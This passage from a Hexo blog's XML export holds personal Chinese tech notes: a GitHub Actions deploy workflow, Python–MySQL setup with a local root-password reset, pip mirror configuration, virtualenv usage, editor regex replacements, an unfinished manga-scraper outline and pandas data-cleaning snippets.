class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">name: Deploy Blog</span><br><span class="line"></span><br><span class="line">on: [push] <span class="comment"># 当有新push时运行</span></span><br><span class="line"> </span><br><span class="line">jobs:</span><br><span class="line">  build: <span class="comment"># 一项叫做build的任务</span></span><br><span class="line">    </span><br><span class="line">    runs-on: ubuntu-latest <span class="comment"># 在最新版的Ubuntu系统下运行</span></span><br><span class="line">    </span><br><span class="line">    steps:</span><br><span class="line">    - name: Checkout <span class="comment"># 将仓库内master分支的内容下载到工作目录</span></span><br><span class="line">      uses: actions<span class="regexp">/checkout@v1 # 脚本来自 https:/</span><span class="regexp">/github.com/</span>actions/checkout</span><br><span class="line">      </span><br><span class="line">    - name: Use Node.js <span class="number">10</span>.x <span class="comment"># 配置Node环境</span></span><br><span class="line">      uses: actions<span class="regexp">/setup-node@v1 # 配置脚本来自 https:/</span><span class="regexp">/github.com/</span>actions/setup-node</span><br><span class="line">      with:</span><br><span class="line">        node-version: <span class="string">&quot;10.x&quot;</span></span><br><span class="line">    </span><br><span class="line">    - name: Setup Hexo env</span><br><span class="line">      env:</span><br><span class="line">        HEXO_DEPLOY_PRIVATE_KEY: <span class="variable">$&#123;&#123; secrets.HEXO_DEPLOY_PRIVATE_KEY &#125;</span>&#125;</span><br><span class="line">      run: |</span><br><span class="line">        <span class="comment"># set up private key for deploy</span></span><br><span class="line">        mkdir -p ~<span class="regexp">/.ssh/</span></span><br><span class="line">        echo <span class="string">&quot;$HEXO_DEPLOY_PRIVATE_KEY&quot;</span> | tr -d <span class="string">&#x27;\r&#x27;</span> &gt; ~<span class="regexp">/.ssh/i</span>d_rsa <span class="comment"># 配置秘钥</span></span><br><span class="line">        chmod <span class="number">600</span> ~<span class="regexp">/.ssh/i</span>d_rsa</span><br><span class="line">        ssh-keyscan github.com &gt;&gt; ~<span class="regexp">/.ssh/</span>known_hosts</span><br><span class="line">        <span class="comment"># set git infomation</span></span><br><span class="line">        git config --global user.name <span class="string">&#x27;linxiaoki&#x27;</span></span><br><span class="line">        git config --global user.email <span class="string">&#x27;linxiaoki@foxmail.com&#x27;</span></span><br><span class="line">        <span class="comment"># install dependencies</span></span><br><span class="line">        npm i -g hexo-cli <span class="comment"># 安装hexo</span></span><br><span class="line">        npm i -g yarn</span><br><span class="line">        yarn install</span><br><span class="line">  </span><br><span class="line">    - name: Deploy</span><br><span class="line">      run: |</span><br><span class="line">        <span class="comment"># publish</span></span><br><span class="line">        hexo clean &amp;&amp; hexo generate &amp;&amp; hexo deploy <span class="comment"># 执行部署程序</span></span><br></pre></td></tr></table></figure><h3 id="参考网址"><a href="#参考网址" class="headerlink" title="参考网址"></a>参考网址</h3><p><a href="https://www.jianshu.com/p/1bc0f13c3b97">https://www.jianshu.com/p/1bc0f13c3b97</a><br><a href="https://blog.csdn.net/dta0502/article/details/84403929">https://blog.csdn.net/dta0502/article/details/84403929</a></p><p><a href="https://blog.csdn.net/jasmineaha/article/details/86383221">next主题美化配置参考</a>|<br><a href="https://www.jianshu.com/p/09f1a1a23c66">next主题美化配置参考2</a>|<br><a href="http://theme-next.iissnan.com/getting-started.html">next 主题配置</a>  |<br><a href="https://www.ackerc.com/">样版网站1</a> |<br><a href="https://notes.iissnan.com/">样板网站2</a>|<br><a href="http://theme-next.iissnan.com/third-party-services.html#comment-system">官方：next 第三方集成工具</a>|<br><a href="https://fontawesome.com/icons?from=io">icon 网站</a><br><a href="https://juejin.im/post/5da03d5e6fb9a04e046bc3a2">Git Action自动化发布Hexo网站到GitHub Pages</a></p>]]></content>
      
      
      <categories>
          
          <category> 有道云笔记-搬 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 博客 </tag>
            
            <tag> github </tag>
            
            <tag> hexo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>通过python操作mysql数据库</title>
      <link href="/categories/Python/python-%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98/%E9%80%9A%E8%BF%87python%E6%93%8D%E4%BD%9Cmysql%E6%95%B0%E6%8D%AE%E5%BA%93/"/>
      <url>/categories/Python/python-%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98/%E9%80%9A%E8%BF%87python%E6%93%8D%E4%BD%9Cmysql%E6%95%B0%E6%8D%AE%E5%BA%93/</url>
      
        <content type="html"><![CDATA[<h4 id="安装文件，设置编码"><a href="#安装文件，设置编码" class="headerlink" title="安装文件，设置编码"></a>安装文件，设置编码</h4><p><a href="https://dev.mysql.com/downloads/file/?id=487425">mysql 5.6.45-win32-bit 文件下载</a></p><p><strong>安装注意：目录不要默认</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[mysql] default-character-set=utf8  # or utf8mb4?</span><br><span class="line">[mysqld] character-set-server=utf8  # or utf8mb4?</span><br></pre></td></tr></table></figure><p>services.msc 重启 mysql5.6</p><h4 id="pip添加库"><a href="#pip添加库" class="headerlink" title="pip添加库"></a>pip添加库</h4><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pip <span class="keyword">install </span>mysql-connector-python --allow-<span class="keyword">external </span>mysql-connector-python</span><br><span class="line">pip <span class="keyword">install </span>mysql-connector</span><br></pre></td></tr></table></figure><span id="more"></span><h3 id="1-MySQLdb-安装"><a href="#1-MySQLdb-安装" class="headerlink" title="1.MySQLdb 安装"></a>1.MySQLdb 安装</h3><p>Centos、Ubuntu 需要先安装【依赖】。那 windows ？</br><br><code>pip install MySQL-python</code> </p><h4 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h4><ul><li><strong>mysql 忘记密码</strong><ol><li><code>my.cnf =&gt; [mysqld] =&gt; skip-grant-tables</code></li><li><code>systemctl restart mysqld.service</code></li><li><code>mysql -u root -p</code> 无密码登录</li><li><code>use mysql</code></li><li><code>update user set password=password(&#39;****&#39;) where user=&#39;root&#39;</code></li><li><code>flush privileges;</code></li><li>重启 mysql</li></ol></li></ul><p>参考网址<br><a href="https://www.cnblogs.com/conanwang/p/6028110.html">python连接数据库</a></p>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
          <category> python 常见问题 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> mysql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>1.5 数据集成</title>
      <link href="/categories/Python/%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90/1-5-%E6%95%B0%E6%8D%AE%E9%9B%86%E6%88%90/"/>
      <url>/categories/Python/%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90/1-5-%E6%95%B0%E6%8D%AE%E9%9B%86%E6%88%90/</url>
      
        <content type="html"><![CDATA[<h4 id="数据集成的三个基本步骤"><a href="#数据集成的三个基本步骤" class="headerlink" title="数据集成的三个基本步骤"></a>数据集成的三个基本步骤</h4><ul><li>抽取：从已有的数据源提取数据</li><li>转换：对原始数据进行处理  <figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">graph</span> LR</span><br><span class="line"><span class="attribute">A1</span>[表输入<span class="number">1</span>]--&gt;B<span class="number">1</span>[排序记录]</span><br><span class="line"><span class="attribute">A2</span>[表输入<span class="number">2</span>]--&gt;B<span class="number">2</span>[排序记录<span class="number">2</span>]</span><br><span class="line"><span class="attribute">A3</span>[表输入<span class="number">3</span>]--&gt;B<span class="number">3</span>[排序记录<span class="number">3</span>]</span><br><span class="line"><span class="attribute">B1</span>--&gt;C[记录集连接<span class="number">1</span>]</span><br><span class="line"><span class="attribute">B2</span>--&gt;C</span><br><span class="line"><span class="attribute">C</span>--&gt;D[排序记录<span class="number">4</span>]</span><br><span class="line"><span class="attribute">D</span>--&gt;E[记录集连接<span class="number">2</span>]</span><br><span class="line"><span class="attribute">B3</span>--&gt;E</span><br><span class="line"><span class="attribute">E</span>--&gt;F[字段选择]</span><br><span class="line"><span class="attribute">F</span>--&gt;G[表输出]</span><br></pre></td></tr></table></figure></li><li>加载?<span id="more"></span><h4 id="数据集成的两种架构"><a href="#数据集成的两种架构" class="headerlink" title="数据集成的两种架构"></a>数据集成的两种架构</h4></li><li><code>ETL(Extract-&gt;Transform-&gt;Load)</code></li><li><code>ELT(Extract-&gt;Load-&gt;Transform)</code></li><li></li></ul><h4 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h4>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
          <category> 数据分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pip 更换第三源提高下载速度</title>
      <link href="/categories/Python/python-%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98/pip-%E6%9B%B4%E6%8D%A2%E7%AC%AC%E4%B8%89%E6%BA%90%E6%8F%90%E9%AB%98%E4%B8%8B%E8%BD%BD%E9%80%9F%E5%BA%A6/"/>
      <url>/categories/Python/python-%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98/pip-%E6%9B%B4%E6%8D%A2%E7%AC%AC%E4%B8%89%E6%BA%90%E6%8F%90%E9%AB%98%E4%B8%8B%E8%BD%BD%E9%80%9F%E5%BA%A6/</url>
      
        <content type="html"><![CDATA[<h4 id="镜像源"><a href="#镜像源" class="headerlink" title="镜像源"></a>镜像源</h4><ul><li>阿里云 <code>http://mirrors.aliyun.com/pypi/simple/ </code></li><li>中国科技大学 <code>https://pypi.mirrors.ustc.edu.cn/simple/ </code></li><li>豆瓣(douban) <code>http://pypi.douban.com/simple/ </code></li><li>清华大学 <code>https://pypi.tuna.tsinghua.edu.cn/simple/ </code></li><li>中国科学技术大学 <code>http://pypi.mirrors.ustc.edu.cn/simple/</code><h4 id="临时使用"><a href="#临时使用" class="headerlink" title="临时使用"></a>临时使用</h4>安装时加 参数时 -i [url]</li></ul><h4 id="永久修改"><a href="#永久修改" class="headerlink" title="永久修改"></a>永久修改</h4><h5 id="linux"><a href="#linux" class="headerlink" title="linux"></a>linux</h5><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="regexp">//</span> 目录新建 ~<span class="regexp">/.pip/</span>pip.ocnf</span><br><span class="line">[global]</span><br><span class="line">index-url = https:<span class="regexp">//</span>......</span><br></pre></td></tr></table></figure><span id="more"></span><h5 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h5><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="regexp">//</span>目录创建 C:\Users\[?]\pip\pip.ini</span><br><span class="line">[global]</span><br><span class="line">index-url = https:<span class="regexp">//</span>....</span><br></pre></td></tr></table></figure><h5 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h5><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[<span class="keyword">global</span>]</span><br><span class="line"><span class="keyword">trusted</span>-host = mirrors.aliyun.com //http</span><br><span class="line"><span class="keyword">index</span>-url = http://mirrors.aliyun.com/pypi/simple/</span><br></pre></td></tr></table></figure><h4 id="升级所有包"><a href="#升级所有包" class="headerlink" title="升级所有包"></a>升级所有包</h4><p><code>pip list</code></p><p><code>pip install --upgrade requests  // mac,linux,unix 在命令前加 sudo -H</code></p><p><code>pip freeze --local | grep -v &#39;^-e&#39; | cut -d = -f 1  | xargs -n1 pip install -U</code></p><p><code>for i in </code>pip list -o –format legacy|awk ‘{print $1}’<code> ; do pip install --upgrade $i; done</code></p>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
          <category> python 常见问题 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> pip </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python：在vsCode中使用virtualenv</title>
      <link href="/categories/Python/python-%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98/python%EF%BC%9A%E5%9C%A8vscode%E4%B8%AD%E4%BD%BF%E7%94%A8virtualenv/"/>
      <url>/categories/Python/python-%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98/python%EF%BC%9A%E5%9C%A8vscode%E4%B8%AD%E4%BD%BF%E7%94%A8virtualenv/</url>
      
        <content type="html"><![CDATA[<p><a href="https://blog.csdn.net/yiifaa/article/details/53420388">参考网址</a></p><p><a href="https://www.cnblogs.com/freely/p/8022923.html">python三大神器</a></p><p>是在<code>Centos 7</code>环境中。</p><h3 id="virtualenv"><a href="#virtualenv" class="headerlink" title="virtualenv"></a><code>virtualenv</code></h3><h4 id="1-安装"><a href="#1-安装" class="headerlink" title="1.安装"></a>1.安装</h4><p><code>pip install virtualenv -v</code></p><h4 id="2-使用"><a href="#2-使用" class="headerlink" title="2.使用"></a>2.使用</h4><p><strong>命令行</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 打开目录</span></span><br><span class="line">cd some/path/env</span><br><span class="line"><span class="comment">// 创建 (环境默认)</span></span><br><span class="line">virtualenv [my_project_env]</span><br><span class="line"><span class="comment">// 创建 (环境 指定) </span></span><br><span class="line">virtualenv -p [python目录/python.exe] [my_project_env]</span><br><span class="line"><span class="comment">// 其他参数</span></span><br><span class="line">--no-site-packages   <span class="comment">//新版默认此option</span></span><br><span class="line">--system-site-packages  </span><br><span class="line"><span class="comment">// 启动虚拟环境</span></span><br><span class="line">cd script =&gt; activate  <span class="comment">// linux: source [my_project_env]/bin/activate</span></span><br><span class="line"><span class="comment">// 停止</span></span><br><span class="line">deactivate</span><br></pre></td></tr></table></figure><span id="more"></span><h4 id="3-移植"><a href="#3-移植" class="headerlink" title="3.移植"></a>3.移植</h4><ul><li>存在 A, B 服务器，现需将 A 服务器中的虚拟环境移植到 B 服务器中</li><li>A, B 服务器的 python 版本需要一致(版本号+(32/64 bit))</li><li>A 需要先：<ul><li>生成安装包列表 <ul><li>pip list =&gt; 复制保存到 packages.txt）</li><li><code>pip freeze &gt; requirements.txt  和  pip install -r requirements.txt</code>  安装相同版本的包</li></ul></li></ul></li><li>直接复制不可以吗？</li></ul><h3 id="virtualenvwrapper"><a href="#virtualenvwrapper" class="headerlink" title="virtualenvwrapper"></a><code>virtualenvwrapper</code></h3><h4 id="1-安装-1"><a href="#1-安装-1" class="headerlink" title="1.安装"></a>1.安装</h4><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="regexp">//</span>virtualenvwrapper 管理工具 linux???</span><br><span class="line">pip install virtualenvwrapper -v  <span class="comment"># 这个是？</span></span><br><span class="line"><span class="regexp">//</span>windows 需要</span><br><span class="line">pip install virtualenvwrapper-win</span><br></pre></td></tr></table></figure><p>windows 双击：virtualenvwrapper.bat</p><p>然后配置路径 <a href="https://www.cnblogs.com/freely/p/8022923.html">-&gt;教程</a></p><h4 id="2-使用-1"><a href="#2-使用-1" class="headerlink" title="2.使用"></a>2.使用</h4><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="regexp">//</span>在 Envs 中创建 project_env 虚拟环境</span><br><span class="line">mkvirtualenv [project_env]</span><br><span class="line"><span class="regexp">//</span>选择 python 解释器搭建</span><br><span class="line">mkvirtualenv env --python=python2.<span class="number">7</span></span><br><span class="line"><span class="regexp">//</span>虚拟环境 project_env 上工作</span><br><span class="line">workon project_env</span><br></pre></td></tr></table></figure><h3 id="其他工具"><a href="#其他工具" class="headerlink" title="其他工具"></a>其他工具</h3><h4 id="supervisor"><a href="#supervisor" class="headerlink" title="supervisor"></a>supervisor</h4><p>进程意外中断能过自动重启。</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">pip install supervisor</span></span><br><span class="line"><span class="section">----</span></span><br><span class="line">supervisord   启动服务，默认端口9001</span><br><span class="line">supervisorctl   命令行控制窗口</span><br></pre></td></tr></table></figure><h4 id="安装-fabric"><a href="#安装-fabric" class="headerlink" title="安装 fabric"></a>安装 fabric</h4><p>项目的批量部署与管理</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip <span class="keyword">install</span> fabric</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
          <category> python 常见问题 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> virtualenv </tag>
            
            <tag> vscode </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文本编辑器中使用正则进行替换文本</title>
      <link href="/categories/%E6%9C%89%E9%81%93%E4%BA%91%E7%AC%94%E8%AE%B0-%E6%90%AC/%E6%96%87%E6%9C%AC%E7%BC%96%E8%BE%91%E5%99%A8%E4%B8%AD%E4%BD%BF%E7%94%A8%E6%AD%A3%E5%88%99%E8%BF%9B%E8%A1%8C%E6%9B%BF%E6%8D%A2%E6%96%87%E6%9C%AC/"/>
      <url>/categories/%E6%9C%89%E9%81%93%E4%BA%91%E7%AC%94%E8%AE%B0-%E6%90%AC/%E6%96%87%E6%9C%AC%E7%BC%96%E8%BE%91%E5%99%A8%E4%B8%AD%E4%BD%BF%E7%94%A8%E6%AD%A3%E5%88%99%E8%BF%9B%E8%A1%8C%E6%9B%BF%E6%8D%A2%E6%96%87%E6%9C%AC/</url>
      
        <content type="html"><![CDATA[<h4 id="使用的正则表达式"><a href="#使用的正则表达式" class="headerlink" title="使用的正则表达式"></a>使用的正则表达式</h4><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">\b(.*)\.append\(result_json\[i\](.?)\[(.*)\]\)</span><br><span class="line">==&gt;</span><br><span class="line"><span class="meta">$1</span> = [result_i<span class="meta">$2</span>[<span class="meta">$3</span>] <span class="keyword">if</span> <span class="meta">$3</span> <span class="keyword">in</span> result_i <span class="keyword">else</span> np.<span class="keyword">nan</span> <span class="keyword">for</span> result_i <span class="keyword">in</span> result_json[i]]</span><br><span class="line"><span class="comment">----------</span></span><br><span class="line">.*?  非贪婪匹配，可能出现的变量 <span class="meta">$2</span></span><br></pre></td></tr></table></figure><span id="more"></span><p>最后结果不太对。。。</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">jobName_list<span class="selector-class">.append</span>(result_json<span class="selector-attr">[i]</span><span class="selector-attr">[<span class="string">&quot;jobName&quot;</span>]</span>)</span><br><span class="line">        company_name_list<span class="selector-class">.append</span>(result_json<span class="selector-attr">[i]</span><span class="selector-attr">[<span class="string">&quot;company&quot;</span>]</span><span class="selector-attr">[<span class="string">&quot;name&quot;</span>]</span>)</span><br><span class="line">        company_code_list<span class="selector-class">.append</span>(result_json<span class="selector-attr">[i]</span><span class="selector-attr">[<span class="string">&quot;company&quot;</span>]</span><span class="selector-attr">[<span class="string">&quot;number&quot;</span>]</span>)</span><br><span class="line">        company_type_list<span class="selector-class">.append</span>(result_json<span class="selector-attr">[i]</span><span class="selector-attr">[<span class="string">&quot;company&quot;</span>]</span><span class="selector-attr">[<span class="string">&quot;type&quot;</span>]</span><span class="selector-attr">[<span class="string">&quot;name&quot;</span>]</span>)</span><br><span class="line">        company_size_list<span class="selector-class">.append</span>(result_json<span class="selector-attr">[i]</span><span class="selector-attr">[<span class="string">&quot;company&quot;</span>]</span><span class="selector-attr">[<span class="string">&quot;size&quot;</span>]</span><span class="selector-attr">[<span class="string">&quot;name&quot;</span>]</span>)</span><br><span class="line">        updataDate_list<span class="selector-class">.append</span>(result_json<span class="selector-attr">[i]</span><span class="selector-attr">[<span class="string">&quot;updateDate&quot;</span>]</span>)</span><br><span class="line">        salary_list<span class="selector-class">.append</span>(result_json<span class="selector-attr">[i]</span><span class="selector-attr">[<span class="string">&quot;salary&quot;</span>]</span>)</span><br><span class="line">        eduLevel_list<span class="selector-class">.append</span>(result_json<span class="selector-attr">[i]</span><span class="selector-attr">[<span class="string">&quot;eduLevel&quot;</span>]</span><span class="selector-attr">[<span class="string">&quot;name&quot;</span>]</span>)</span><br><span class="line">        jobType_list<span class="selector-class">.append</span>(result_json<span class="selector-attr">[i]</span><span class="selector-attr">[<span class="string">&quot;jobType&quot;</span>]</span><span class="selector-attr">[<span class="string">&quot;items&quot;</span>]</span><span class="selector-attr">[0]</span><span class="selector-attr">[<span class="string">&quot;name&quot;</span>]</span>)</span><br><span class="line">==&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="更改markdown-文档中-img-为-html"><a href="#更改markdown-文档中-img-为-html" class="headerlink" title="更改markdown 文档中 img 为 html"></a>更改markdown 文档中 img 为 html</h4><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">!\[(.*)\]\(.*(//.*)\)</span><br><span class="line">=&gt;</span><br><span class="line">&lt;img src=<span class="string">&quot;$2&quot;</span> alt=<span class="string">&quot;$1&quot;</span> width=<span class="string">&quot;625&quot;</span> data-width=<span class="string">&quot;625&quot;</span> data-height=<span class="string">&quot;32&quot;</span>&gt;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 有道云笔记-搬 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sublime </tag>
            
            <tag> 正则 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>教程：使用python爬取漫画</title>
      <link href="/categories/Python/python-%E5%AE%9E%E8%B7%B5/%E6%95%99%E7%A8%8B%EF%BC%9A%E4%BD%BF%E7%94%A8python%E7%88%AC%E5%8F%96%E6%BC%AB%E7%94%BB/"/>
      <url>/categories/Python/python-%E5%AE%9E%E8%B7%B5/%E6%95%99%E7%A8%8B%EF%BC%9A%E4%BD%BF%E7%94%A8python%E7%88%AC%E5%8F%96%E6%BC%AB%E7%94%BB/</url>
      
        <content type="html"><![CDATA[<h2 id="没写完，。。。。。"><a href="#没写完，。。。。。" class="headerlink" title="没写完，。。。。。"></a>没写完，。。。。。</h2><h3 id="前期准备"><a href="#前期准备" class="headerlink" title="前期准备"></a>前期准备</h3><h4 id="一些无关紧要的话"><a href="#一些无关紧要的话" class="headerlink" title="一些无关紧要的话"></a>一些无关紧要的话</h4><p>在浏览器上，对于一张图片我们可以通过 <strong>右键-另存图像</strong>来保存。那么，如果图像有很多，并且在不同页面上，我们又该怎么办呢？<br><br>这时候就轮到<code>python</code>出场了。在这篇文章，我们将会使用<code>python</code>下载漫画【鬼灭之刃】(因为我想看)。<br>尽量详细<br>最好的学习是自己创造使用场景。</p><h4 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h4><p>环境要求：python 3.0  <br><br>使用的库： <code>request_html</code> 和 <code>PIL</code><br>运行: python<br>需要：python 基础，一点点 html 知识。</p><span id="more"></span><h3 id="实践"><a href="#实践" class="headerlink" title="实践"></a>实践</h3><h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><p>通过<code>python</code>可以访问网页，我们可以遍历访问每一话的网址，再获取每一话的所有图片的下载地址。</p><h4 id="从网页获取-目标网址规则"><a href="#从网页获取-目标网址规则" class="headerlink" title="从网页获取 目标网址规则"></a>从网页获取 目标网址规则</h4><h5 id="选择器-筛选出需要的网址"><a href="#选择器-筛选出需要的网址" class="headerlink" title="选择器-筛选出需要的网址"></a>选择器-筛选出需要的网址</h5><p>获取章节的xpath路径<br>  搜索【鬼灭之刃 漫画】，选择可以在线观看的网站。如图所示，按<strong>F12</strong>，<br><code>xpath:/html/body/table[5]/tbody/tr/td[2]/table/tbody/tr[1]/td/table/tbody/tr[6]/td/dl/dd[9]/a[1]</code>   a[4个来源]</p><h4 id="漫画-m话-n页-（画-思维导图），我们需要获取"><a href="#漫画-m话-n页-（画-思维导图），我们需要获取" class="headerlink" title="漫画- m话 - n页 （画 思维导图），我们需要获取"></a>漫画- m话 - n页 （画 思维导图），我们需要获取</h4><p>访问漫画目录页面    获取 001话 标题、网址（第一页）    获取第一页图片下载地址     获取第二页图片下载地址 。。。。。<br>                    获取 002话 标题、网址              获取第一页图片下载地址     获取第二页图片下载地址 。。。。。<br>                    …<br>                    …</p><h3 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h3><p>pip下载库<a href="#%E4%BD%BFpip%E4%B8%8B%E8%BD%BD%E5%BA%93"> 跳转</a></p><h3 id="python-结构"><a href="#python-结构" class="headerlink" title="python 结构"></a>python 结构</h3><p><em>看漫画请支持正版，仅作技术学习（笑）</em></p><h3 id="完整代码如下："><a href="#完整代码如下：" class="headerlink" title="完整代码如下："></a>完整代码如下：</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure><h3 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h3><h4 id="使pip下载库"><a href="#使pip下载库" class="headerlink" title="使pip下载库"></a>使pip下载库</h4><h4 id="pip下载"><a href="#pip下载" class="headerlink" title="pip下载"></a><a id="pip_install">pip下载</a></h4><h3 id="多线程实现"><a href="#多线程实现" class="headerlink" title="多线程实现"></a>多线程实现</h3><h3 id="协程实现"><a href="#协程实现" class="headerlink" title="协程实现"></a>协程实现</h3>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
          <category> python 实践 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> 爬虫 </tag>
            
            <tag> 实践 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>1.4 数据清洗</title>
      <link href="/categories/Python/%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90/1-4-%E6%95%B0%E6%8D%AE%E6%B8%85%E6%B4%97/"/>
      <url>/categories/Python/%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90/1-4-%E6%95%B0%E6%8D%AE%E6%B8%85%E6%B4%97/</url>
      
        <content type="html"><![CDATA[<ul><li>数据的质量（完全合一）：<ul><li><p>完整性(值、统计的字段)  <code>ps:完整和全面没多大区别呀?</code></p><ul><li>问题1：单元格存在缺失值 <ul><li>解决办法：删除缺失记录、使用均值、使用频率最高的值<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#平均</span></span><br><span class="line">df[<span class="string">&#x27;Age&#x27;</span>].fillna(df[<span class="string">&#x27;Age&#x27;</span>].mean(),inplace=<span class="literal">True</span>)</span><br><span class="line"><span class="comment">#高频</span></span><br><span class="line">age_maxf=train_features[<span class="string">&#x27;Age&#x27;</span>].value_counts().index[<span class="number">0</span>]</span><br><span class="line">train_features[<span class="string">&#x27;Age&#x27;</span>].fillna(age_maxf,inplace=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure></li></ul></li><li>问题2：存在 空行 （除了 index ，全部的值是 NaN）</li><li>解决办法：<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#删除全空的行</span></span><br><span class="line">df.dropna(<span class="attribute">how</span>=<span class="string">&#x27;all&#x27;</span>,inplace=True)</span><br></pre></td></tr></table></figure><span id="more"></span></li></ul></li><li><p>全面性：通过【常识】判断某列是否存在问题(最大值，最小值，平均值，数据的定义和单位等)</p><ul><li>数据存在空值、异常值：删除 或者 取平均值</li><li>注意数据的类型、内容、大小</li><li>问题: 列数据单位不统一</li><li>解决方法：<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#获取 weight 数据列中单位为 lbs 的数据</span></span><br><span class="line">rows_with_lbs = df[<span class="string">&#x27;weight&#x27;</span>].<span class="built_in">str</span>.contains(<span class="string">&#x27;lbs&#x27;</span>).fillna(<span class="literal">False</span>)</span><br><span class="line"><span class="comment">#将 lbs 转换为 